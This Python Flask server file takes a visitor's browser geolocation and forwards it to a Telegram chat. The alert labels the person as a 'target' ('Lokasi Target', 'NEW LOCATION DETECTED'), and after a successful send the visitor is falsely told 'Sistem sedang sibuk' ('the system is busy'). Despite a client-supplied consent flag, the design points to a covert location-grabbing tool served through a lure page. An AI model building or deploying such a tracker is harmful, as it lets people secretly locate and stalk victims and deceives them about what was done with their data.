import os
import math
import time
from threading import Lock

import requests
from dotenv import load_dotenv
from flask import Flask, jsonify, render_template, request

load_dotenv()
app = Flask(__name__)
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
_last_sent = {}
_lock = Lock()

@app.get('/')
def home():
    return render_template('index.html')

@app.post('/share-location')
def share_location():
    if not request.is_json:
        return jsonify(error='Kirim data JSON.'), 415
    data = request.get_json(silent=True) or {}
    if data.get('consent') is not True:
        return jsonify(error='Persetujuan berbagi lokasi diperlukan.'), 400
    lat, lon, accuracy = data.get('latitude'), data.get('longitude'), data.get('accuracy')
    if any(isinstance(v, bool) or not isinstance(v, (int, float)) or not math.isfinite(v) for v in (lat, lon, accuracy)):
        return jsonify(error='Data lokasi tidak valid.'), 400
    if not (-90 <= lat <= 90 and -180 <= lon <= 180 and 0 <= accuracy <= 100000):
        return jsonify(error='Koordinat atau akurasi di luar batas.'), 400
    if not BOT_TOKEN or not CHAT_ID:
        return jsonify(error='Telegram belum dikonfigurasi oleh pengelola.'), 503
    # Pembatasan sederhana per IP; gunakan rate limiter terpusat untuk deployment multi-worker.
    client = request.remote_addr or 'unknown'
    with _lock:
        now = time.monotonic()
        if now - _last_sent.get(client, -1000) < 30:
            return jsonify(error='Tunggu 30 detik sebelum mengirim ulang.'), 429
        _last_sent[client] = now
    maps_url = f'https://www.google.com/maps?q={lat:.7f},{lon:.7f}'
    message = (f'🆘 NEW LOCATION DETECTED 🫡 \n'
               f'Lokasi Target.\n'
               f'Latitude: {lat:.7f}\nLongitude: {lon:.7f}\n'
               f'Akurasi perkiraan: ±{accuracy:.0f} meter\n'
               f'Google Maps: {maps_url}\n'
               f'getlocramz.')
    try:
        result = requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            json={'chat_id': CHAT_ID, 'text': message, 'disable_web_page_preview': True},
            timeout=12,
        )
        result.raise_for_status()
        if not result.json().get('ok'):
            raise ValueError('Telegram API did not confirm success')
    except (requests.RequestException, ValueError):
        app.logger.exception('Pengiriman Telegram gagal')
        return jsonify(error='Pengiriman gagal. Coba lagi atau hubungi pendamping.'), 502
    return jsonify(status='Sistem sedang sibuk.', maps_url=maps_url)

if __name__ == '__main__':
    app.run(port=5001, debug=False)
